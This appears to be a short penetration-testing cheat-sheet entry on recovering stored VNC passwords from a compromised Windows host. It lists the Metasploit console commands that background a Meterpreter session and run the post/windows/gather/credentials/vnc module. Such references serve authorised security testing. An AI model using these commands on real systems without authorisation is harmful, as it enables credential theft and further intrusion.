---
title: VNC Password Recovery (Meterpreter)
category: privesc
subcategory: windows-creds
os: windows
command: post/windows/gather/credentials/vnc
tools: msfconsole
---


VNC requires a separate password from the user account.

### Meterpreter post module

```
background
use post/windows/gather/credentials/vnc
set session X
exploit
```
